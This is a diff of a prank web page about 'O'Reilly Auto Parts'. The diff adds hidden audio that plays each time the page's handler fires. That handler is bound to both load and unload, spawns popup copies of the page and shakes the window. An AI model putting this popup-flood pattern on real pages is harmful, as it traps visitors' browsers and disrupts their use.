@@ -5,7 +5,9 @@
   </head>
   <body>
     <p>O O O O'REILLY<br>AUTO PARTS</p>
-    
+    <audio style="display:none" id="o">
+      <source src="oreilly.mp3" type="audio/mepg" />
+    </audio>
     <script>
       function w(){
         window.open("./index.html","_blank","width=200,height=200");
@@ -22,6 +24,7 @@
         w();
         w();
         moveBy((Math.random()*20)-10, (Math.random()*20)-10);
+        document.getElementById("o").play();
         return null;
       }
       window.onload = window.onbeforeunload = a;
